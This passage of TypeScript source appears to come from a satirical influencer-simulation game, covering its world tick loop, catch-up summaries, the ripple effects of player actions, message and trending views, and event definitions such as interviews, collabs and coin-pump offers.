      if (tp.magnitude > 4) notify(s, t0, "trend", `#${tp.tag} is trending: ${tp.label}`, `chirp:${tp.tag}`);
    }
    for (const tp of s.topics) {
      const have = s.articles.filter((a) => a.topicId === tp.id).length;
      const cap = tp.about === "god" ? Math.ceil(tp.magnitude / 1.6) : Math.ceil(tp.magnitude / 3);
      if (tp.category !== "chat" && tp.heat > 3 && have < cap && rng.chance(0.22)) makeArticle(s, rng, tp, t0 + rng.next() * 5 * MIN);
    }
    if (s.events.filter((e) => !e.resolved).length < 3 && rng.chance(0.07)) spawnEvent(s, rng, t0);
    for (const e of s.events) if (!e.resolved && e.expiresAt <= t0) e.resolved = { choiceId: "expired", outcome: "You didn't respond. The internet moved on.", t: e.expiresAt };
    drift(s, rng, 5 * MIN);
  }
  if (b % 90 === 0) s.player.netWorthHistory.push({ t: t0, v: Math.round(netWorth(s)) });
  if (b % 180 === 0) prune(s);

  // deliver scheduled messages whose time has come
  if (s.pending.length) {
    const due: Message[] = [], later: Message[] = [];
    for (const m of s.pending) (m.t < t1 ? due : later).push(m);
    if (due.length) {
      due.sort((a, b) => a.t - b.t || (a.id < b.id ? -1 : 1));
      s.messages.push(...due);
      s.pending = later;
    }
  }
  s.simTime = t1;
}

export interface SimProgress { done: number; total: number }

/** Advance the world to `to`. Long gaps are compressed to the last MAX_FULL_SIM of full simulation. */
export function simulate(s: WorldState, to: number, opts: { maxBuckets?: number } = {}): { compressed: boolean; processed: number } {
  let compressed = false;
  const target = Math.floor(to / BUCKET);
  let b = Math.floor(s.simTime / BUCKET);
  if ((target - b) * BUCKET > MAX_FULL_SIM) {
    const skipTo = target - MAX_FULL_SIM / BUCKET;
    const dt = (skipTo - b) * BUCKET;
    drift(s, null, dt);
    decay(s, dt);
    s.simTime = skipTo * BUCKET;
    b = skipTo;
    compressed = true;
  }
  let processed = 0;
  const limit = opts.maxBuckets ?? Infinity;
  while (b < target && processed < limit) {
    processBucket(s, b);
    b++;
    processed++;
  }
  return { compressed, processed };
}

export interface CatchUpBaseline { from: number; simFrom: number; stats: WorldState["stats"]; opinion: number; events: number; netWorth: number; followers: number; compressed: boolean }
const avgOpinion = (s: WorldState) => s.characters.reduce((a, c) => a + c.opinion, 0) / s.characters.length;

export function baseline(s: WorldState, from: number): CatchUpBaseline {
  return { from, simFrom: s.simTime, stats: { ...s.stats }, opinion: avgOpinion(s), events: s.events.length, netWorth: netWorth(s), followers: s.player.followers, compressed: false };
}

export function summarize(s: WorldState, base: CatchUpBaseline, to: number): CatchUpSummary & { netWorthDelta: number; followerDelta: number } {
  const from = base.from;
  const inRange = s.messages.filter((m) => m.t >= from && m.t <= to);
  const bySrv = new Map<string, number>();
  for (const m of inRange) bySrv.set(m.serverId, (bySrv.get(m.serverId) ?? 0) + 1);
  const topServers = [...bySrv.entries()].sort((a, b) => b[1] - a[1]).filter(([id]) => id !== "dm").slice(0, 5).map(([id, count]) => ({ name: s.servers.find((x) => x.id === id)?.name ?? "DMs", count }));
  const topTopics = s.topics.filter((t) => t.startedAt >= from - HOUR || t.heat > 3).sort((a, b) => b.heat - a.heat).slice(0, 6).map((t) => ({ tag: t.tag, heat: Math.round(t.heat * 10) / 10 }));
  const arts = s.articles.filter((a) => a.t >= from && a.t <= to).sort((a, b) => b.reads - a.reads);
  const posts = s.posts.filter((p) => p.t >= from && p.t <= to && p.authorId.startsWith("c")).sort((a, b) => b.likes - a.likes);
  const highlights: string[] = [];
  for (const a of arts.slice(0, 3)) highlights.push(`📰 ${s.outlets.find((o) => o.id === a.outletId)!.name}: ${a.headline}`);
  if (posts[0]) highlights.push(`🔥 Top Chirp: @${charById(s, posts[0].authorId).username}: "${posts[0].text.slice(0, 90)}"`);
  const newEvents = s.events.slice(base.events).filter((e) => !e.resolved);
  for (const e of newEvents.slice(0, 2)) highlights.push(`⚡ Waiting on you: ${e.title}`);
  const newTopics = s.topics.filter((t) => t.startedAt >= from && t.about === "god");
  for (const t of newTopics.slice(0, 2)) highlights.push(`👀 New storyline: ${t.label}`);
  for (const g of (s.godMoments ?? []).filter((g) => g.t >= from - 10 * MIN && g.t <= to).slice(-4)) highlights.push(g.text);
  return {
    from, to, simulatedFrom: base.simFrom,
    messages: s.stats.messages - base.stats.messages, posts: s.stats.posts - base.stats.posts, articles: s.stats.articles - base.stats.articles,
    events: newEvents.length, mentions: inRange.filter((m) => m.authorId !== "god" && (m.mentionsGod || /@god\b/i.test(m.text))).length, topTopics, topServers, opinionShift: Math.round((avgOpinion(s) - base.opinion) * 10) / 10, highlights, compressed: base.compressed,
    netWorthDelta: netWorth(s) - base.netWorth, followerDelta: s.player.followers - base.followers,
  };
}

/** Synchronous catch-up (tests, server). The UI uses the chunked variant in store.ts. */
export function catchUp(s: WorldState, to: number) {
  const base = baseline(s, s.lastSeenAt);
  const r = simulate(s, to);
  base.compressed = r.compressed;
  s.lastSeenAt = to;
  return summarize(s, base, to);
}

// ---------- @god actions & ripples ----------
export interface RippleResult { topic: Topic; magnitude: number; breaking: boolean; servers: string[]; posts: number; articles: Article[]; headline?: string }

export function ripple(s: WorldState, topic: Topic, now: number, rng: Rng, focus?: { serverId: string; channelId: string }): RippleResult {
  const mag = topic.magnitude;
  const breaking = mag >= 7;
  topic.breaking = breaking;
  const serverCount = Math.min(s.servers.length, Math.round(2 + mag * (breaking ? 2.4 : 1.3)));
  const ranked = [...s.servers].sort((a, b) => (b.tags.includes("god") ? 1 : 0) - (a.tags.includes("god") ? 1 : 0) || Math.abs(b.bias) - Math.abs(a.bias));
  const chosen = rng.shuffle(ranked.slice(0, Math.min(s.servers.length, serverCount + 3))).slice(0, serverCount);
  if (focus && focus.serverId !== "dm" && !chosen.some((x) => x.id === focus.serverId)) chosen.unshift(s.servers.find((x) => x.id === focus.serverId)!);
  const window = breaking ? 90_000 : 6 * MIN;
  for (const srv of chosen) {
    const chs = srv.channels.filter((c) => !c.announce);
    const early = breaking && (srv.tags.includes("god") || chosen.indexOf(srv) < 3);
    const ch = focus && srv.id === focus.serverId ? srv.channels.find((c) => c.id === focus.channelId)! : early ? chs.find((c) => c.name === "general") ?? chs[0] : rng.weighted(chs, (c) => channelMatch(c, topic) * (c.name === "general" ? 2 : 1));
    const t = early ? now + 1500 + rng.next() * 6000 : now + 2000 + rng.next() * window;
    runEpisode(s, rng, srv, ch, t, topic, { mode: focus && srv.id === focus.serverId ? "godReply" : "reaction" });
    if (breaking && rng.chance(0.6)) {
      const ch2 = rng.pick(chs);
      runEpisode(s, rng, srv, ch2, t + rng.range(20, 240) * 1000, topic, { mode: "reaction" });
    }
  }
  const nPosts = Math.round(mag * (breaking ? 5 : 2.5));
  const influencers = s.characters.filter((c) => c.influencer);
  let posts = 0;
  for (let i = 0; i < nPosts; i++) {
    const author = i < Math.ceil(nPosts / 3) ? rng.pick(influencers) : undefined;
    makePost(s, rng, breaking && i < 5 ? now + 2500 + i * 1500 + rng.next() * 2000 : now + 4000 + rng.next() * window * 2, { topic, author, platform: i < nPosts * 0.6 ? "chirp" : undefined });
    posts++;
  }
  // event chain: the discourse comes back in waves
  if (mag >= 4) {
    s.bus.push({ id: nid(s, "v"), kind: "followup", t: Math.round(now + rng.range(15, 40) * MIN), topicId: topic.id, data: {} });
    if (mag >= 6) s.bus.push({ id: nid(s, "v"), kind: "followup", t: Math.round(now + rng.range(2, 6) * HOUR), topicId: topic.id, data: {} });
  }
  const articles: Article[] = [];
  const nArt = breaking ? rng.int(3, 6) : mag >= 4.5 ? 1 : 0;
  for (let i = 0; i < nArt; i++) articles.push(makeArticle(s, rng, topic, now + 15_000 + i * rng.range(20, 70) * 1000, i === 0 && breaking ? "breaking" : undefined));
  if (breaking) {
    notify(s, now, "trend", `🚨 #${topic.tag} is #1 trending worldwide`, `chirp:${topic.tag}`);
    notify(s, now + 5000, "mention", `Mentions of @god are spiking across ${chosen.length} servers`, `chirp:${topic.tag}`);
  } else if (mag >= 4) notify(s, now, "trend", `#${topic.tag} is trending`, `chirp:${topic.tag}`);
  return { topic, magnitude: mag, breaking, servers: chosen.map((x) => x.name), posts, articles, headline: articles[0]?.headline };
}

export interface ActionInput { kind: ActionKind; name: string; cost: number; boost?: number }

export function applyAction(s: WorldState, input: ActionInput, now: number): RippleResult | { error: string } {
  simulate(s, now);
  const def = actionDef(input.kind);
  const cost = Math.max(0, input.cost);
  if (cost > s.player.cash) return { error: `Not enough cash. You have ${fmtMoney(s.player.cash)}.` };
  const rng = rngFor(s.seed, "action", s.counter, input.kind, input.name);
  s.player.cash -= cost;
  const name = input.name.trim() || def.names[0];
  if (def.holding) {
    const mult: Record<string, number> = { business: 1.1, coin: rng.range(2, 9), vehicle: 0.92, jet: 0.95, property: 1.02, island: 1.05, investment: 1, organization: 0.3 };
    s.player.holdings.push({
      id: nid(s, "h"), kind: def.holding, name: input.kind === "coin" ? `$${name.replace(/^\$/, "").toUpperCase()}` : name, value: Math.round(cost * (mult[def.holding] ?? 1)), acquiredAt: now,
      detail: def.title, employees: input.kind === "business" ? rng.int(12, 900) : undefined, yieldPerDay: input.kind === "business" ? Math.round(cost * 0.0009) : input.kind === "investment" ? Math.round(cost * 0.0003) : undefined,
    });
  }
  if (input.kind === "hire") {
    const hq = s.player.holdings.find((h) => h.id === "h-holdings");
    if (hq) hq.employees = (hq.employees ?? 0) + rng.int(5, 500);
  }
  const mag = magnitudeFor(input.kind, cost, input.boost ?? 0);
  const subject = input.kind === "coin" ? name.replace(/^\$/, "").toUpperCase() : name;
  const topic: Topic = {
    id: nid(s, "t"), tag: input.kind === "coin" ? subject : tagify(`God ${def.kind === "announcement" || def.kind === "controversy" ? def.kind : subject}`), label: def.label(subject), about: "god", category: input.kind,
    valence: def.valence + (rng.next() - 0.5) * 0.2, magnitude: mag, heat: mag * 7, startedAt: now, subject, amount: cost || undefined, facts: { action: input.kind, coin: input.kind === "coin" ? subject : "GOD", ticker: subject },
  };
  s.topics.push(topic);
  s.player.followers += Math.round(mag * mag * 30_000 * rng.range(0.6, 1.6));
  s.player.influence = clamp(s.player.influence + mag * 0.35, 0, 100);
  s.player.reputation = clamp(s.player.reputation + topic.valence * mag * 0.7, 0, 100);
  s.player.history.push({ t: now, text: `${def.icon} ${def.title}: ${name}${cost ? ` (${fmtMoney(cost)})` : ""}`, topicId: topic.id });
  if (cost) notify(s, now, "money", `${fmtMoney(-cost)} · ${def.title}: ${name}`);
  const res = ripple(s, topic, now, rng);
  undernetOnAction(s, topic, now);
  return res;
}

export function resolveEvent(s: WorldState, eventId: string, choiceId: string, now: number): { outcome: string; ripple?: RippleResult } | { error: string } {
  simulate(s, now);
  const ev = s.events.find((e) => e.id === eventId);
  if (!ev || ev.resolved) return { error: "Event not available" };
  const def = EVENT_DEFS.find((d) => d.type === ev.type)!;
  const rng = rngFor(s.seed, "event", ev.id, choiceId);
  const eff = def.resolve(choiceId, rng, ev.data, s);
  const p = s.player;
  if (eff.cash) p.cash = Math.max(0, p.cash + eff.cash);
  if (eff.reputation) p.reputation = clamp(p.reputation + eff.reputation, 0, 100);
  if (eff.influence) p.influence = clamp(p.influence + eff.influence, 0, 100);
  if (eff.followers) p.followers += eff.followers;
  if (eff.opinion) for (const c of s.characters) c.opinion = clamp(c.opinion + eff.opinion * (0.5 + rng.next()), -100, 100);
  ev.resolved = { choiceId, outcome: eff.outcome, t: now };
  p.history.push({ t: now, text: `⚡ ${ev.title} → ${ev.choices.find((c) => c.id === choiceId)?.label}: ${eff.outcome}` });
  if (eff.cash) notify(s, now, "money", `${fmtMoney(eff.cash, { sign: true })} · ${ev.title}`);
  let rip: RippleResult | undefined;
  if (eff.topic) {
    const tp: Topic = { id: nid(s, "t"), tag: tagify(`God ${eff.topic.label}`), label: eff.topic.label, about: "god", category: eff.topic.category, valence: eff.topic.valence, magnitude: eff.topic.magnitude, heat: eff.topic.magnitude * 6, startedAt: now, subject: eff.topic.subject, amount: eff.topic.amount, facts: {} };
    s.topics.push(tp);
    rip = ripple(s, tp, now, rng);
  }
  return { outcome: eff.outcome, ripple: rip };
}

/** @god types in a Lounge channel or DM — see godspeak.ts for the reaction pipeline. */
export function godSay(s: WorldState, serverId: string, channelId: string, text: string, now: number, replyTo?: string) {
  simulate(s, now);
  return godSpeak(s, serverId, channelId, text, now, replyTo);
}

/** @god edits or deletes one of his own messages. */
export function godEdit(s: WorldState, id: string, text: string | null, now: number) {
  const m = s.messages.find((x) => x.id === id) ?? s.pending.find((x) => x.id === id);
  if (!m || m.authorId !== "god") return false;
  if (text === null) { m.deleted = true; m.text = ""; m.reactionLog = []; m.reactions = []; }
  else { m.text = text; m.editedAt = now; delete m.editText; }
  const g = s.godLog.find((x) => x.id === id);
  if (g) { if (text === null) s.godLog = s.godLog.filter((x) => x.id !== id); else g.text = text; }
  return true;
}

/** @god toggles a reaction on any message. Adding one (with `now`) sets off the room. */
export function godReact(s: WorldState, id: string, emoji: string, now?: number) {
  const m = s.messages.find((x) => x.id === id) ?? s.pending.find((x) => x.id === id);
  if (!m) return 0;
  const r = m.reactions.find((x) => x.emoji === emoji);
  if (r?.me) { r.count--; r.me = false; if (r.count <= 0) m.reactions = m.reactions.filter((x) => x !== r); return 0; }
  if (r) { r.count++; r.me = true; }
  else m.reactions.push({ emoji, count: 1, me: true });
  return now === undefined ? 0 : reactCascade(s, m, emoji, now);
}

export function godPin(s: WorldState, id: string, now: number) {
  const m = s.messages.find((x) => x.id === id) ?? s.pending.find((x) => x.id === id);
  if (!m) return;
  if (m.pinnedAt && m.pinnedAt <= now) delete m.pinnedAt; else m.pinnedAt = now;
}

/** @god likes / reposts a post (toggle). Counts move by exactly one. */
export function godPostAction(s: WorldState, postId: string, kind: "like" | "repost") {
  const p = s.posts.find((x) => x.id === postId);
  if (!p) return;
  if (kind === "like") { p.godLiked = !p.godLiked; p.likes += p.godLiked ? 1 : -1; }
  else { p.godReposted = !p.godReposted; p.reposts += p.godReposted ? 1 : -1; }
}

/** @god posts on a platform. */
export function godPost(s: WorldState, platform: PlatformId, text: string, now: number, quoteOf?: string, replyTo?: string): RippleResult {
  simulate(s, now);
  const rng = rngFor(s.seed, "post", s.counter);
  const topic: Topic = { id: nid(s, "t"), tag: tagify(`God ${text.split(" ").slice(0, 3).join(" ")}`) || "GodPost", label: `god's post`, about: "god", category: "announcement", valence: 0.15, magnitude: clamp(3.5 + text.length / 120 + rng.range(0, 2), 1, 8), heat: 20, startedAt: now, subject: text.slice(0, 80), facts: {} };
  s.topics.push(topic);
  const e = engagementFor(rng, undefined, topic.heat, true, s.player.followers);
  const post: Post = { id: nid(s, "p"), platform, authorId: "god", text, t: now, topicId: topic.id, quoteOf, replyTo, ...e, score: 20 };
  s.posts.push(post);
  if (replyTo) { const parent = s.posts.find((x) => x.id === replyTo); if (parent) parent.replies++; topic.magnitude = Math.min(topic.magnitude, 3.5); }
  // real replies under god's post (the reply count is the number of stored replies)
  for (let i = 0, n = Math.round(clamp(3 + topic.magnitude, 3, 12)); i < n; i++) makePost(s, rng, now + 3000 + Math.exp(rng.gauss() * 0.8 + Math.log(40)) * 1000, { topic, platform: "chirp", replyToId: post.id });
  s.stats.posts++;
  s.player.history.push({ t: now, text: `📝 Posted on ${platform}: "${text.slice(0, 60)}"`, topicId: topic.id });
  return ripple(s, topic, now, rng);
}

// ---------- views ----------
export function channelMessages(s: WorldState, channelId: string, now: number, limit = 120): Message[] {
  const a = s.messages.filter((m) => m.channelId === channelId && !m.threadOf);
  const b = s.pending.filter((m) => m.channelId === channelId && m.t <= now && !m.threadOf);
  return [...a, ...b].sort((x, y) => x.t - y.t || (x.id < y.id ? -1 : 1)).slice(-limit);
}
export function threadMessages(s: WorldState, rootId: string, now: number): Message[] {
  return [...s.messages, ...s.pending].filter((m) => m.threadOf === rootId && m.t <= now).sort((x, y) => x.t - y.t);
}
/** who is typing in a channel right now (backed by scheduled messages) */
export function typingIn(s: WorldState, channelId: string, now: number, threadOf?: string): string[] {
  const out: string[] = [];
  for (const m of s.pending) {
    if (m.channelId !== channelId || m.t <= now || m.authorId === "god" || m.kind !== "chat" || (m.threadOf ?? undefined) !== threadOf) continue;
    const from = m.typingFrom ?? m.t - clamp(m.text.length * 60, 1200, 8000);
    if (from <= now && !out.includes(m.authorId)) out.push(m.authorId);
  }
  return out;
}
export interface UnreadInfo { n: number; mentions: number }
/** one pass over everything: unread + mention counts per channel */
export function unreadIndex(s: WorldState, now: number, lastRead: Record<string, number>, fallback: number): Map<string, UnreadInfo> {
  const out = new Map<string, UnreadInfo>();
  const godIds = new Set(s.godLog.map((g) => g.id));
  const add = (m: Message) => {
    if (m.t > now || m.authorId === "god" || m.threadOf || m.kind === "bot") return;
    if (m.t <= (lastRead[m.channelId] ?? fallback)) return;
    const u = out.get(m.channelId) ?? { n: 0, mentions: 0 };
    u.n++;
    if (m.mentionsGod || (m.replyTo && godIds.has(m.replyTo)) || (m.serverId === "dm" && m.channelId.includes("god"))) u.mentions++;
    out.set(m.channelId, u);
  };
  // messages are delivered in time order, so scan back from the end and stop once we're well past the
  // oldest read marker that matters (capped at a day; older unread isn't surfaced as a badge)
  let floor = fallback;
  for (const v of Object.values(lastRead)) if (v < floor) floor = v;
  floor = Math.max(floor, now - 24 * 3600e3) - 10 * 60e3;
  for (let i = s.messages.length - 1; i >= 0; i--) { const m = s.messages[i]; if (m.t < floor) break; add(m); }
  for (const m of s.pending) add(m);
  return out;
}
/** reactions as visible at `now` (stored + those that have landed since) */
export function reactionsAt(m: Message, now: number): Reaction[] {
  if (!m.reactionLog?.length) return m.reactions;
  const out = m.reactions.map((r) => ({ ...r }));
  for (const [e, t] of m.reactionLog) {
    if (t > now) continue;
    const r = out.find((x) => x.emoji === e);
    if (r) r.count++; else out.push({ emoji: e, count: 1 });
  }
  return out.sort((a, b) => b.count - a.count);
}
export const textAt = (m: Message, now: number) => (m.editText && m.editedAt && m.editedAt <= now ? m.editText : m.text);
export const isEdited = (m: Message, now: number) => !!m.editedAt && m.editedAt <= now;
export function pinnedIn(s: WorldState, channelId: string, now: number): Message[] {
  return [...s.messages, ...s.pending].filter((m) => m.channelId === channelId && m.pinnedAt && m.pinnedAt <= now && !m.deleted).sort((a, b) => b.pinnedAt! - a.pinnedAt!);
}
export function dmThreads(s: WorldState, now: number) {
  const map = new Map<string, Message>();
  for (const m of [...s.messages, ...s.pending]) if (m.serverId === "dm" && m.t <= now) { const c = map.get(m.channelId); if (!c || c.t < m.t) map.set(m.channelId, m); }
  return [...map.entries()].map(([channelId, last]) => ({ channelId, last, withGod: channelId.split(":").includes("god") })).sort((a, b) => b.last.t - a.last.t);
}
export function trending(s: WorldState, now: number, limit = 10) {
  const best = new Map<string, Topic>();
  for (const t of s.topics) {
    if (t.startedAt > now || t.heat <= 0.3) continue;
    const k = t.tag.toLowerCase();
    const cur = best.get(k);
    if (!cur || t.heat > cur.heat) best.set(k, t);
  }
  const top = [...best.values()].sort((a, b) => b.heat - a.heat).slice(0, limit);
  // post counts are real: stored posts + messages tagged with the topic (or its tag)
  const tags = new Map(top.map((t) => [t.tag.toLowerCase(), 0]));
  const tagOf = new Map(s.topics.map((t) => [t.id, t.tag.toLowerCase()]));
  for (const p of s.posts) { const k = p.topicId && tagOf.get(p.topicId); if (k && tags.has(k) && p.t <= now) tags.set(k, tags.get(k)! + 1); }
  for (const m of s.messages) { const k = m.topicId && tagOf.get(m.topicId); if (k && tags.has(k)) tags.set(k, tags.get(k)! + 1); }
  return top.map((t, i) => ({ topic: t, rank: i + 1, posts: tags.get(t.tag.toLowerCase()) ?? 0 }));
}
export const channelUnread = (s: WorldState, channelId: string, since: number, now: number) =>
  s.messages.filter((m) => m.channelId === channelId && m.t > since && !m.threadOf).length + s.pending.filter((m) => m.channelId === channelId && m.t > since && m.t <= now && !m.threadOf).length;

/** Seed the very first world with some history so it never opens empty. */
export function bootstrap(s: WorldState, now: number, hours = 3, opts: { defer?: boolean } = {}) {
  const rng = rngFor(s.seed, "boot");
  const start = Math.floor((now - hours * HOUR) / BUCKET) * BUCKET;
  s.simTime = start;
  for (let i = 0; i < 4; i++) { const c = celebPick(s, rng); s.topics.push(worldTopic(rng, nid(s, "t"), start, c.displayName, c.id)); }
  for (let i = 0; i < 2; i++) { const c = celebPick(s, rng); s.topics.push(autoGodTopic(rng, nid(s, "t"), start, c.displayName, c.id)); }
  s.topics.push({ id: nid(s, "t"), tag: "GodCreativeMode", label: "the 'creative mode' post", about: "god", category: "viral", valence: 0.4, magnitude: 5, heat: 14, startedAt: start, subject: "life is easier on creative mode", facts: {} });
  spawnEvent(s, rng, start + HOUR);
  if (!opts.defer) simulate(s, now);
  s.lastSeenAt = now;
  return s;
}

```

## src/lib/sim/events.ts
```ts
import type { Rng } from "./rng";
import type { Choice, WorldState } from "./types";
import { LEAK_CHOICES, resolveLeak } from "./undernet";

export interface Effect {
  cash?: number;
  reputation?: number;
  influence?: number;
  followers?: number;
  opinion?: number; // global opinion nudge
  topic?: { category: string; label: string; subject: string; valence: number; magnitude: number; amount?: number };
  outcome: string;
}

export interface EventDef {
  type: string;
  weight: number;
  make: (rng: Rng, s: WorldState) => { title: string; body: string; fromId?: string; data: Record<string, string | number> };
  choices: Choice[];
  resolve: (choiceId: string, rng: Rng, data: Record<string, string | number>, s: WorldState) => Effect;
}

const celebOf = (rng: Rng, s: WorldState) => {
  const c = rng.pick(s.celebrities);
  return s.characters[Number(c.id.slice(1))];
};

export const EVENT_DEFS: EventDef[] = [
  {
    type: "interview", weight: 3,
    make: (rng, s) => { const o = rng.pick(s.outlets); return { title: `${o.name} wants an interview`, body: `${rng.pick(o.authors).name} is asking for 30 minutes on camera about "the God effect".`, data: { outlet: o.name } }; },
    choices: [{ id: "accept", label: "Do the interview", hint: "+influence, risky quotes" }, { id: "decline", label: "Decline", hint: "mystery intact" }, { id: "troll", label: "Answer only in emojis", hint: "memes guaranteed" }],
    resolve: (c, rng, d) => c === "accept"
      ? (rng.chance(0.7) ? { influence: 4, reputation: 3, followers: 600_000, outcome: `The ${d.outlet} interview landed well. Clips everywhere.`, topic: { category: "interview", label: `the ${d.outlet} interview`, subject: "I don't chase attention. It finds me.", valence: 0.5, magnitude: 5 } }
        : { influence: 3, reputation: -6, followers: 300_000, outcome: `One quote from the ${d.outlet} interview got taken out of context.`, topic: { category: "controversy", label: `the ${d.outlet} interview quote`, subject: "Most people just don't want it enough.", valence: -0.5, magnitude: 6 } })
      : c === "troll" ? { influence: 2, followers: 900_000, reputation: -1, outcome: "The emoji-only interview is now a meme format.", topic: { category: "viral", label: "the emoji-only interview", subject: "👑🏝️💸🤫", valence: 0.3, magnitude: 5.5 } }
      : { reputation: 1, outcome: "You declined. Fan theories about why are already circulating." },
  },
  {
    type: "collab", weight: 3,
    make: (rng, s) => { const c = celebOf(rng, s); return { title: `${c.displayName} wants a collab`, fromId: c.id, body: `${c.displayName} (${c.occupation}) DM'd: "us two. one project. internet breaks. you in?"`, data: { celeb: c.displayName, fee: rng.int(2, 40) * 1e6 } }; },
    choices: [{ id: "yes", label: "Collab", hint: "costs money, huge reach" }, { id: "no", label: "Leave on read", hint: "might start beef" }, { id: "counter", label: "Counter: they come to the island", hint: "flex" }],
    resolve: (c, rng, d) => c === "yes" ? { cash: -Number(d.fee), influence: 5, followers: 2_000_000, reputation: 2, outcome: `The ${d.celeb} collab is announced. Both fanbases are losing it.`, topic: { category: "collab", label: `the ${d.celeb} collab`, subject: `${d.celeb}`, valence: 0.5, magnitude: 6.5, amount: Number(d.fee) } }
      : c === "no" ? { reputation: -2, outcome: `${d.celeb} posted "noted." Fans smell beef.`, topic: { category: "mention", label: `${d.celeb} getting left on read`, subject: `left ${d.celeb} on read`, valence: -0.3, magnitude: 5 } }
      : { influence: 3, followers: 800_000, outcome: `${d.celeb} accepted the island invite. Paparazzi boats spotted.`, topic: { category: "collab", label: `${d.celeb}'s island visit`, subject: `${d.celeb}`, valence: 0.4, magnitude: 6 } },
  },
  {
    type: "buyout", weight: 2,
    make: (rng, s) => { const h = s.player.holdings.filter((x) => x.kind === "business" || x.kind === "investment"); const t = h.length ? rng.pick(h) : undefined; const mult = rng.range(1.2, 2.2); return { title: `Buyout offer for ${t?.name ?? "GOD Holdings"}`, body: `A private fund offers ${mult.toFixed(1)}x value. Deadline tonight.`, data: { holding: t?.id ?? "", name: t?.name ?? "GOD Holdings", mult } }; },
    choices: [{ id: "sell", label: "Sell", hint: "cash now" }, { id: "refuse", label: "Refuse publicly", hint: "+reputation" }, { id: "raise", label: "Ask for 3x", hint: "gamble" }],
    resolve: (c, rng, d, s) => {
      const h = s.player.holdings.find((x) => x.id === d.holding);
      const val = h?.value ?? 0;
      if (c === "sell" && h) { s.player.holdings = s.player.holdings.filter((x) => x !== h); return { cash: val * Number(d.mult), influence: -2, outcome: `Sold ${d.name} for ${Number(d.mult).toFixed(1)}x.`, topic: { category: "acquisition", label: `the ${d.name} sale`, subject: `${d.name}`, valence: 0.1, magnitude: 6, amount: val * Number(d.mult) } }; }
      if (c === "raise") return rng.chance(0.35) && h ? (s.player.holdings = s.player.holdings.filter((x) => x !== h), { cash: val * 3, outcome: `They paid 3x for ${d.name}. Legendary.`, topic: { category: "acquisition", label: `the 3x ${d.name} deal`, subject: `${d.name}`, valence: 0.6, magnitude: 7.5, amount: val * 3 } }) : { reputation: -1, outcome: "The fund walked. Analysts call it greedy." };
      return { reputation: 4, influence: 1, outcome: `"${d.name} isn't for sale." Fans are printing it on shirts.`, topic: { category: "announcement", label: `the "not for sale" post`, subject: `${d.name} isn't for sale.`, valence: 0.5, magnitude: 4.5 } };
    },
  },
  {
    type: "allegation", weight: 2,
    make: (rng) => { const claim = rng.pick(["your island is a rental", "you bought 10M bot followers", "your coin team dumped on fans", "you never wrote your own posts"]); return { title: "An anonymous account is accusing you", body: `A Chirp thread claiming ${claim} has 2M views and climbing.`, data: { claim } }; },
    choices: [{ id: "deny", label: "Deny with receipts", hint: "costs time, fixes rep" }, { id: "ignore", label: "Ignore", hint: "might fade, might grow" }, { id: "sue", label: "Threaten to sue", hint: "Streisand risk" }],
    resolve: (c, rng, d) => c === "deny" ? { reputation: 5, outcome: "Receipts posted. Community note added to the original thread.", topic: { category: "announcement", label: "the receipts thread", subject: "Receipts. Have a nice day.", valence: 0.5, magnitude: 5 } }
      : c === "sue" ? { reputation: -5, influence: 2, outcome: "The lawsuit threat made the claim go 10x more viral.", topic: { category: "controversy", label: `the claim that ${d.claim}`, subject: `${d.claim}`, valence: -0.7, magnitude: 7.5 } }
      : rng.chance(0.5) ? { outcome: "It fizzled. The internet moved on." } : { reputation: -6, outcome: "Silence was read as guilt. It's trending.", topic: { category: "allegation", label: `the claim that ${d.claim}`, subject: `${d.claim}`, valence: -0.6, magnitude: 6 } },
  },
  {
    type: "fan", weight: 3,
    make: (rng, s) => { const c = rng.pick(s.characters.filter((x) => x.opinion > 40)); const ask = rng.pick(["pay for my mom's surgery", "rate my startup pitch", "shout out my art", "come to my graduation", "buy my car so I can pay rent"]); return { title: `@${c.username} is asking you to ${ask}`, fromId: c.id, body: `${c.displayName} (${c.age}, ${c.location}) posted in GOD HQ. 4k reactions.`, data: { ask, who: c.username, cid: c.id } }; },
    choices: [{ id: "help", label: "Do it", hint: "costs a little, big love" }, { id: "shout", label: "Just reply", hint: "cheap" }, { id: "ignore", label: "Ignore", hint: "nothing" }],
    resolve: (c, rng, d) => c === "help" ? { cash: -rng.int(20, 400) * 1000, reputation: 6, opinion: 3, followers: 400_000, outcome: `You did it. @${d.who} is crying on stream.`, topic: { category: "viral", label: `god helping @${d.who}`, subject: `god agreed to ${d.ask}`, valence: 0.9, magnitude: 5.5 } }
      : c === "shout" ? { reputation: 1, followers: 50_000, outcome: `@${d.who} framed your reply.` } : { outcome: "The post scrolled away." },
  },
  {
    type: "coinpump", weight: 2,
    make: (rng) => { const coin = rng.pick(["FROG", "MOONCAT", "BONKLE", "TOAST", "YETI"]); return { title: `Degens want you to post about $${coin}`, body: `Pump Pit is begging you to mention $${coin}. One post could 10x it.`, data: { coin } }; },
    choices: [{ id: "post", label: "Post about it", hint: "influence, possible backlash" }, { id: "refuse", label: "Refuse", hint: "+trust" }],
    resolve: (c, rng, d) => c === "post" ? (rng.chance(0.5) ? { influence: 4, cash: rng.int(5, 40) * 1e6, outcome: `$${d.coin} went 8x. Pump Pit is building you a shrine.`, topic: { category: "coin", label: `the $${d.coin} pump`, subject: `${d.coin}`, valence: 0.1, magnitude: 6.5 } } : { reputation: -8, outcome: `$${d.coin} crashed 70% after the pump. Community notes everywhere.`, topic: { category: "controversy", label: `the $${d.coin} crash`, subject: `${d.coin}`, valence: -0.7, magnitude: 7 } })
      : { reputation: 3, outcome: "You said no. Skeptics Anonymous grudgingly respects it." },
  },
  {
    type: "rival", weight: 2,
    make: (rng, s) => { const c = celebOf(rng, s); return { title: `${c.displayName} is talking trash`, fromId: c.id, body: `"${rng.pick(["god is a brand, not a person", "I could out-buy him any day", "his island is smaller than my pool", "god peaked in 2024"])}" — ${c.displayName}`, data: { celeb: c.displayName } }; },
    choices: [{ id: "clap", label: "Clap back", hint: "drama ↑" }, { id: "rise", label: "Take the high road", hint: "+reputation" }, { id: "buy", label: "Buy something bigger", hint: "costs $" }],
    resolve: (c, rng, d) => c === "clap" ? { influence: 3, reputation: -2, followers: 1_200_000, outcome: `The clapback has 30M views. ${d.celeb} is typing...`, topic: { category: "controversy", label: `the ${d.celeb} clapback`, subject: `${d.celeb} is a footnote.`, valence: -0.1, magnitude: 7 } }
      : c === "buy" ? { cash: -250e6, influence: 4, outcome: "You bought a bigger pool. On a bigger island.", topic: { category: "property", label: "the bigger pool", subject: "a pool visible from orbit", valence: 0.2, magnitude: 6, amount: 250e6 } }
